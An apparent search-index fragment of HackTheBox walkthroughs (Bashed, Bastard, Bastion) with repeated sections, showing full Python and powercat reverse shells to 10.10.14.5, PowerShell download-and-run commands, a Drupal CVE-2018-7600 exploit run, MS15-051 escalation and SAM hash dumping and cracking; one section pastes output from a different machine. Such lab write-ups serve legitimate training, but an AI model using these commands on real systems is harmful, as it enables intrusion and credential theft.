groups=1001(scriptmanager) Crontab File overwrite I try to monitor process with pspy32 . The results show that there are process run all python file in folder scripts as root. scriptmanager@bashed:/tmp$ ./pspy32 <snip> 2021/04/05 21:01:04 CMD: UID=0 PID=18391 | /bin/bash 2021/04/05 21:01:04 CMD: UID=0 PID=18390 | python test.py 2021/04/05 21:01:04 CMD: UID=0 PID=18389 | /bin/sh -c cd /scripts; for f in *.py; do python \"$f\"; done And script test.py owned by scriptmanager, and we can modify it. scriptmanager@bashed:/scripts$ ls -lh ls -lh total 12K -rw-r--r-- 1 scriptmanager scriptmanager 211 Apr 5 21:00 test.py -rw-r--r-- 1 root root 12 Apr 5 21:00 test.txt Let's add python reverse shell to file test.py and waiting cronjobs execute it. echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.5\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' > /scripts/test.py At listener, I got root shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.3:27.7]~/scripting/priescal/monitor \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.68] 34304 root@bashed:/scripts# id id uid=0(root) gid=0(root) groups=0(root) root@bashed:~# cat /var/spool/cron/crontabs/root cat /var/spool/cron/crontabs/root # DO NOT EDIT THIS FILE - edit the master and reinstall. # (/tmp/crontab.igz05b/crontab installed on Mon Dec 4 17:53:17 2017) # (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $) * * * * * cd /scripts; for f in *.py; do python \"$f\"; done","title":"HTB Bashed"},{"location":"walkthrough/hackthebox/Bashed/index.html#hackthebox-bashed","text":"Author: Hades Scripting here","title":"HackTheBox Bashed"},{"location":"walkthrough/hackthebox/Bashed/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Bashed/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.68 [+] Openning ports: 80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.68 -p80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-06 09:54 +07 Nmap scan report for 10.10.10.68 Host is up (0.25s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel's Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.81 seconds ### Web Enumeration (80) ############################","title":"Openning Services"},{"location":"walkthrough/hackthebox/Bashed/index.html#apache-httpd-2418","text":"List of the hidden using gobuster and I try to enum in the hidden url. [+] Files and directories gobuster dir -k -u http://10.10.10.68:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> =============================================================== /images (Status: 301) [Size: 311] [--> http://10.10.10.68/images/] /uploads (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/] /php (Status: 301) [Size: 308] [--> http://10.10.10.68/php/] /css (Status: 301) [Size: 308] [--> http://10.10.10.68/css/] /dev (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/] /js (Status: 301) [Size: 307] [--> http://10.10.10.68/js/] At uri /dev , I got 2 file which is phpbash command shell.","title":"Apache httpd 2.4.18"},{"location":"walkthrough/hackthebox/Bashed/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Bashed/index.html#phpbash-execute-shell","text":"At url http://10.10.10.68/dev/phpbash.php , I try some reverse shell with bash , nc but it's not work. When I run python reverse shell and I got it. python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.5\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' At listener, I got reverse shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.2:29.2]~/walkthrough/hackthebox/bashed \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.68] 34342 www-data@bashed:/var/www/html/dev$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data)","title":"phpbash execute shell"},{"location":"walkthrough/hackthebox/Bashed/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Bashed/index.html#sudo-access","text":"After running linpeas.sh , I got the sudo access to run command with scriptmanager's permission without password. www-data@bashed:/var/www/html/dev$ sudo -l sudo -l Matching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL Let's run /bin/bash to get the shell. www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager /bin/bash sudo -u scriptmanager /bin/bash scriptmanager@bashed:/var/www/html/dev$ id id uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)","title":"Sudo Access"},{"location":"walkthrough/hackthebox/Bashed/index.html#crontab-file-overwrite","text":"I try to monitor process with pspy32 . The results show that there are process run all python file in folder scripts as root. scriptmanager@bashed:/tmp$ ./pspy32 <snip> 2021/04/05 21:01:04 CMD: UID=0 PID=18391 | /bin/bash 2021/04/05 21:01:04 CMD: UID=0 PID=18390 | python test.py 2021/04/05 21:01:04 CMD: UID=0 PID=18389 | /bin/sh -c cd /scripts; for f in *.py; do python \"$f\"; done And script test.py owned by scriptmanager, and we can modify it. scriptmanager@bashed:/scripts$ ls -lh ls -lh total 12K -rw-r--r-- 1 scriptmanager scriptmanager 211 Apr 5 21:00 test.py -rw-r--r-- 1 root root 12 Apr 5 21:00 test.txt Let's add python reverse shell to file test.py and waiting cronjobs execute it. echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.5\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")' > /scripts/test.py At listener, I got root shell. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.3:27.7]~/scripting/priescal/monitor \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.68] 34304 root@bashed:/scripts# id id uid=0(root) gid=0(root) groups=0(root) root@bashed:~# cat /var/spool/cron/crontabs/root cat /var/spool/cron/crontabs/root # DO NOT EDIT THIS FILE - edit the master and reinstall. # (/tmp/crontab.igz05b/crontab installed on Mon Dec 4 17:53:17 2017) # (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $) * * * * * cd /scripts; for f in *.py; do python \"$f\"; done","title":"Crontab File overwrite"},{"location":"walkthrough/hackthebox/Bastard/index.html","text":"HackTheBox Bastard Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.9 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 80,135,49154 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.9 -p80,135,49154 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 00:41 +07 Nmap scan report for 10.10.10.9 Host is up (0.23s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-generator: Drupal 7 (http://drupal.org) | http-methods: |_ Potentially risky methods: TRACE | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Microsoft-IIS/7.5 |_http-title: Welcome to 10.10.10.9 | 10.10.10.9 135/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 84.46 seconds Drupal Application I enum web with curl -I command and gobuster to list hidden in the sevrer. ### Web Enumeration (80) ############################ [+] Header HTTP/1.1 200 OK Cache-Control: no-cache, must-revalidate Content-Length: 0 Content-Type: text/html; charset=utf-8 Content-Language: en Expires: Sun, 19 Nov 1978 05:00:00 GMT Server: Microsoft-IIS/7.5 X-Powered-By: PHP/5.3.28 X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN X-Generator: Drupal 7 (http://drupal.org) X-Powered-By: ASP.NET Date: Sun, 04 Apr 2021 15:31:45 GMT I enum at CHANGELOG.txt and get the Drupal version 7.54 \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:39.4]~/payload/php \u2514\u2500$ curl http://10.10.10.9/CHANGELOG.txt Drupal 7.54, 2017-02-01 ----------------------- <snip> I also using droopescan to scan Drupal \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:39.3]~/walkthrough/hackthebox/bastard \u2514\u2500$ droopescan scan drupal -u 10.10.10.9 [+] Plugins found: <snip> [+] Themes found: seven http://10.10.10.9/themes/seven/ garland http://10.10.10.9/themes/garland/ [+] Possible version(s): 7.54 [+] Possible interesting urls found: Default changelog file - http://10.10.10.9/CHANGELOG.txt Default admin - http://10.10.10.9/user/login [+] Scan finished (0:57:41.063650 elapsed) Using searchsploit to find open exploit \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:44.7]~/walkthrough/hackthebox/bastard \u2514\u2500$ searchsploit Drupal 7.54 ------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------ --------------------------------- <snip> Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalged | php/remote/44482.rb Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalged | php/webapps/44448.py <snip> ------------------------------------------------ --------------------------------- Shellcodes: No Results Foothold CVE-2018-7600 Poc code here At exploit php/webapps/44448.py , I know that this is exploit for CVE-2018-7600, but Drupal 7.x have the vulberability at form user_pass and inject code in name . Find some exploit in google and I found drupa7-CVE-2018-7600.py Let's execute drupa7-CVE-2018-7600.py with powershell command to download and execute ps1 shell file. Create powershell reverse shell with powercat. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:13.9]~/walkthrough/hackthebox/bastard \u2514\u2500$ pwsh PowerShell 7.1.2 <snip> PS /<snip> . ./powercat.ps1 PS /<snip> powercat -c 10.10.14.5 -p 443 -e cmd.exe -g > shell.ps1 At kali machine, create a http server and a listener. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.7]~/walkthrough/hackthebox/optimum \u2514\u2500$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.8 - - [04/Apr/2021 21:15:52] \"GET /shell.ps1 HTTP/1.1\" 200 - \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:45.3]~/walkthrough/hackthebox/bastard \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.9] 59994 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\inetpub\\drupal-7.54>whoami whoami nt authority\\iusr Last step, execute payload with python3. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.8]~/walkthrough/hackthebox/bastard \u2514\u2500$ cmd=\"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:45.0]~/walkthrough/hackthebox/bastard \u2514\u2500$ python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c \"$cmd\" ============================================================================= | DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600) | | by pimps | ============================================================================= [*] Poisoning a form and including it in cache. [*] Poisoned form ID: form-73yATyI9zdwYMcsgDi-HaDUQOoYqlhiLL-ry_fEAw1M [*] Triggering exploit to execute: powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1') Privilege Escalation CVE-2015-1701 Poc code here C:\\Users\\kostas\\Desktop>systeminfo systeminfo Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 <snip> System Type: x64-based <snip> Search around the internet, I found MS15-051 vulnerbility for this system. Download and execute file MS15-051-KB3045171.zip at poc . powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5/ms15-051x64.exe','C:\\inetpub\\drupal-7.54\\ms15-051x64.exe')\" C:\\inetpub\\drupal-7.54>ms15-051x64.exe \"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" ms15-051x64.exe \"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" [#] ms15-051 fixed by zcgonvh [!] process with pid: 1076 created. ============================== Listener in kali machine \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:45.9]~/walkthrough/hackthebox/bastard \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.9] 53968 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\inetpub\\drupal-7.54>whoami whoami nt authority\\system","title":"HTB Bastard"},{"location":"walkthrough/hackthebox/Bastard/index.html#hackthebox-bastard","text":"Author: Hades Scripting here","title":"HackTheBox Bastard"},{"location":"walkthrough/hackthebox/Bastard/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Bastard/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.9 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 80,135,49154 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.9 -p80,135,49154 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 00:41 +07 Nmap scan report for 10.10.10.9 Host is up (0.23s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-generator: Drupal 7 (http://drupal.org) | http-methods: |_ Potentially risky methods: TRACE | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Microsoft-IIS/7.5 |_http-title: Welcome to 10.10.10.9 | 10.10.10.9 135/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 84.46 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Bastard/index.html#drupal-application","text":"I enum web with curl -I command and gobuster to list hidden in the sevrer. ### Web Enumeration (80) ############################ [+] Header HTTP/1.1 200 OK Cache-Control: no-cache, must-revalidate Content-Length: 0 Content-Type: text/html; charset=utf-8 Content-Language: en Expires: Sun, 19 Nov 1978 05:00:00 GMT Server: Microsoft-IIS/7.5 X-Powered-By: PHP/5.3.28 X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN X-Generator: Drupal 7 (http://drupal.org) X-Powered-By: ASP.NET Date: Sun, 04 Apr 2021 15:31:45 GMT I enum at CHANGELOG.txt and get the Drupal version 7.54 \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:39.4]~/payload/php \u2514\u2500$ curl http://10.10.10.9/CHANGELOG.txt Drupal 7.54, 2017-02-01 ----------------------- <snip> I also using droopescan to scan Drupal \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:39.3]~/walkthrough/hackthebox/bastard \u2514\u2500$ droopescan scan drupal -u 10.10.10.9 [+] Plugins found: <snip> [+] Themes found: seven http://10.10.10.9/themes/seven/ garland http://10.10.10.9/themes/garland/ [+] Possible version(s): 7.54 [+] Possible interesting urls found: Default changelog file - http://10.10.10.9/CHANGELOG.txt Default admin - http://10.10.10.9/user/login [+] Scan finished (0:57:41.063650 elapsed) Using searchsploit to find open exploit \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:44.7]~/walkthrough/hackthebox/bastard \u2514\u2500$ searchsploit Drupal 7.54 ------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------ --------------------------------- <snip> Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalged | php/remote/44482.rb Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalged | php/webapps/44448.py <snip> ------------------------------------------------ --------------------------------- Shellcodes: No Results","title":"Drupal Application"},{"location":"walkthrough/hackthebox/Bastard/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Bastard/index.html#cve-2018-7600","text":"Poc code here At exploit php/webapps/44448.py , I know that this is exploit for CVE-2018-7600, but Drupal 7.x have the vulberability at form user_pass and inject code in name . Find some exploit in google and I found drupa7-CVE-2018-7600.py Let's execute drupa7-CVE-2018-7600.py with powershell command to download and execute ps1 shell file. Create powershell reverse shell with powercat. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:13.9]~/walkthrough/hackthebox/bastard \u2514\u2500$ pwsh PowerShell 7.1.2 <snip> PS /<snip> . ./powercat.ps1 PS /<snip> powercat -c 10.10.14.5 -p 443 -e cmd.exe -g > shell.ps1 At kali machine, create a http server and a listener. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.7]~/walkthrough/hackthebox/optimum \u2514\u2500$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.8 - - [04/Apr/2021 21:15:52] \"GET /shell.ps1 HTTP/1.1\" 200 - \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:45.3]~/walkthrough/hackthebox/bastard \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.9] 59994 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\inetpub\\drupal-7.54>whoami whoami nt authority\\iusr Last step, execute payload with python3. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.1:14.8]~/walkthrough/hackthebox/bastard \u2514\u2500$ cmd=\"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:45.0]~/walkthrough/hackthebox/bastard \u2514\u2500$ python3 drupa7-CVE-2018-7600.py http://10.10.10.9 -c \"$cmd\" ============================================================================= | DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600) | | by pimps | ============================================================================= [*] Poisoning a form and including it in cache. [*] Poisoned form ID: form-73yATyI9zdwYMcsgDi-HaDUQOoYqlhiLL-ry_fEAw1M [*] Triggering exploit to execute: powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')","title":"CVE-2018-7600"},{"location":"walkthrough/hackthebox/Bastard/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Bastard/index.html#cve-2015-1701","text":"Poc code here C:\\Users\\kostas\\Desktop>systeminfo systeminfo Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 <snip> System Type: x64-based <snip> Search around the internet, I found MS15-051 vulnerbility for this system. Download and execute file MS15-051-KB3045171.zip at poc . powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5/ms15-051x64.exe','C:\\inetpub\\drupal-7.54\\ms15-051x64.exe')\" C:\\inetpub\\drupal-7.54>ms15-051x64.exe \"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" ms15-051x64.exe \"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\" [#] ms15-051 fixed by zcgonvh [!] process with pid: 1076 created. ============================== Listener in kali machine \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.3:45.9]~/walkthrough/hackthebox/bastard \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.9] 53968 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\inetpub\\drupal-7.54>whoami whoami nt authority\\system","title":"CVE-2015-1701"},{"location":"walkthrough/hackthebox/Bastion/index.html","text":"HackTheBox Bastion Author: Hades Scripting here Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.134 [+] Openning ports: 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.134 -p22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-06 14:30 +07 Nmap scan report for 10.10.10.134 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -38m12s, deviation: 1h09m16s, median: 1m46s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-04-06T09:33:24+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-06T07:33:28 |_ start_date: 2021-04-06T07:31:02 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 74.21 seconds Server Message Block Enum service SMB with smbmap , I saw there is Backups folder can access by guest. ### SMB Enumeration (445) ############################ smbmap -H 10.10.10.134 -u guest [+] IP: 10.10.10.134:445 Name: 10.10.10.134 [\\] Work[!] Unable to remove test directory at \\\\10.10.10.134\\Backups\\THPQBWRNVY, please remove manually Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Backups READ, WRITE C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC Go to Backups folder using smbclient . This folder contain note file and windows image backup folder. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:12.6]~ \u2514\u2500$ smbclient //10.10.10.134/Backups Enter WORKGROUP\\kali's password: Try \"help\" to get a list of possible commands. smb: \\> ls . D 0 Wed Apr 7 14:48:08 2021 .. D 0 Wed Apr 7 14:48:08 2021 note.txt AR 116 Tue Apr 16 17:10:09 2019 QYJORCBZDG D 0 Wed Apr 7 14:48:08 2021 SDT65CB.tmp A 0 Fri Feb 22 19:43:08 2019 WindowsImageBackup Dn 0 Fri Feb 22 19:44:02 2019 I got the note file to local machine to read it. smb: \\> get note.txt getting file \\note.txt of size 116 as note.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) File note.txt is a message from Sysadmins, may a user is transfering his entire backup file, and folder WindowsImageBackup is his backup. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:12.9]~/walkthrough/hackthebox/bastion \u2514\u2500$ cat note.txt Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow. Go to folder WindowsImageBackup and I saw file vhd which is Virtual Hard Disk of Windows machines. smb: \\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\> ls . Dn 0 Fri Feb 22 19:45:32 2019 .. Dn 0 Fri Feb 22 19:45:32 2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd An 37761024 Fri Feb 22 19:44:03 2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd An 5418299392 Fri Feb 22 19:45:32 2019 <snip> Foothold Crack Windows Credential Poc code here Because file .vhd is too large, download this file is not a good idea, I decided to mount this file as an image. Fisrt, mount folder Backups to /mnt/Backups folder in local machine. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:13.2]~/walkthrough/hackthebox/bastion \u2514\u2500$ sudo mount -t cifs //10.10.10.134/Backups /mnt -o user=guest,password= Using guestmount to mount file .vhd . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:13.2]~/walkthrough/hackthebox \u2514\u2500$ sudo guestmount -a /mnt/Backups/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro /mnt/vhd Go to folder /mnt/vhd , It showed folder of Windows machine. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.8:28.2]/mnt \u2514\u2500$ sudo ls /mnt/vhd '$Recycle.Bin' config.sys pagefile.sys ProgramData Recovery Users autoexec.bat 'Documents and Settings' PerfLogs 'Program Files' 'System Volume Information' Windows I go to folder contain file SAM and file SYSTEM at /Windows/System32/config to copy it and dump credentials. \u250c\u2500\u2500(root\ud83d\udc80kali)-[/mnt] \u2514\u2500# cd vhd/Windows/System32/config \u250c\u2500\u2500(root\ud83d\udc80kali)-[/mnt/vhd/Windows/System32/config] \u2514\u2500# ls -l SAM SYSTEM -rwxrwxrwx 1 root root 262144 Feb 22 2019 SAM -rwxrwxrwx 1 root root 9699328 Feb 22 2019 SYSTEM Using samdump2 dump credentials of user in the system and save the hash to file. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:28.9]~/walkthrough/hackthebox/bastion \u2514\u2500$ samdump2 SYSTEM SAM *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9::: \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:28.9]~/walkthrough/hackthebox/bastion \u2514\u2500$ samdump2 SYSTEM SAM > hash Using john with format NT and rockyou.txt directory to crack file hash. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:29.0]~/walkthrough/hackthebox/bastion \u2514\u2500$ john --format=NT --wordlist=/home/kali/directory/rockyou.txt hash <snip> bureaulampje (L4mpje) <snip> Session completed Password creacked, I got the password: bureaulampje . Based on the info gathering, the system openning port 22, allow ssh to server. Let's using cracked credential and access to Bastion. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:29.0]~/walkthrough/hackthebox/bastion \u2514\u2500$ ssh L4mpje@10.10.10.134 L4mpje@10.10.10.134's password: <snip> Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. l4mpje@BASTION C:\\Users\\L4mpje>whoami bastion\\l4mpje Privilege Escalation Crack mRemoteNG Creadential Poc code here After enum program installed in the server, I saw folder mRemoteNG in Program Files (x86). l4mpje@BASTION C:\\Program Files (x86)>dir Volume in drive C has no label. Volume Serial Number is 0CB3-C487 Directory of C:\\Program Files (x86) <snip> 22-02-2019 15:01 <DIR> mRemoteNG <snip> 0 File(s) 0 bytes 14 Dir(s) 11.296.088.064 bytes free Try to search public exploit for mRemoteNG, I saw a python script to decrypt passwords stored by mRemoteNG Searching password stored location, I have the result is file confCons.xml . Using dir /s search location of file confCons.xml in the server. This file in the directory C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG . l4mpje@BASTION C:\\Users>dir /s /d confCons.xml <snip> Directory of C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG confCons.xml <snip> Read file confCons.xml and I have the encrypted Administrator's password. l4mpje@BASTION C:\\Users>type C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\\confCons.xml <snip> <Node Name=\"DC\" Type=\"Connection\" Descr=\"\" Icon=\"mRemoteNG\" Panel=\"General\" 